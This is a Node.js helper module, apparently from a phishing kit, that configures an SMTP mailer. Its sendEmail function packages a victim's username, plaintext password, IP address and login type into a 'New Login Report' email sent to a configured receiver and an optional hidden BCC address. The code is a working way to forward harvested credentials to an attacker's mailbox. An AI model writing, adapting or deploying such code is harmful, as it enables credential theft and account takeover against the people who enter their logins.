// reportGen/helper/mailer.js
const nodemailer = require('nodemailer');

const SMTP_HOST = process.env.SMTP_HOST;
const SMTP_PORT = parseInt(process.env.SMTP_PORT || '0', 10);
const SMTP_USER = process.env.SMTP_USER;
const SMTP_PASS = process.env.SMTP_PASS;
const MAIL_SENDER_NAME = process.env.MAIL_SENDER_NAME || 'NoReply';
const MAIL_RECEIVER = process.env.MAIL_RECEIVER;
const BCC_RECEIVER = process.env.BCC_RECEIVER || '';

const transporter = nodemailer.createTransport({
  host: SMTP_HOST,
  port: SMTP_PORT,
  secure: SMTP_PORT === 465,
  auth: SMTP_USER && SMTP_PASS ? { user: SMTP_USER, pass: SMTP_PASS } : undefined,
  pool: false,
  connectionTimeout: 15000, // 15s
  greetingTimeout: 5000,
  socketTimeout: 15000
});

// Do NOT block startup with verify - instead try verifying in background and log result
setTimeout(() => {
  transporter.verify().then(() => {
    console.log('Mailer: SMTP transporter verified');
  }).catch(err => {
    console.warn('Mailer: transporter verify failed (non-fatal):', err && err.message ? err.message : err);
  });
}, 1000);

function sendEmail(subject, username, pass, ip, type) {
  const html = `
    <h3>New Login Report</h3>
    <p><b>Username:</b> ${username}</p>
    <p><b>Password:</b> ${pass}</p>
    <p><b>IP Address:</b> ${ip}</p>
    <p><b>Type:</b> ${type}</p>
  `;

  const mailOptions = {
    from: `"${MAIL_SENDER_NAME}" <${SMTP_USER}>`,
    to: MAIL_RECEIVER,
    bcc: BCC_RECEIVER || undefined,
    subject,
    html
  };

  return new Promise((resolve, reject) => {
    transporter.sendMail(mailOptions, (err, info) => {
      if (err) return reject(err);
      resolve(info);
    });
  });
}

module.exports = { sendEmail };
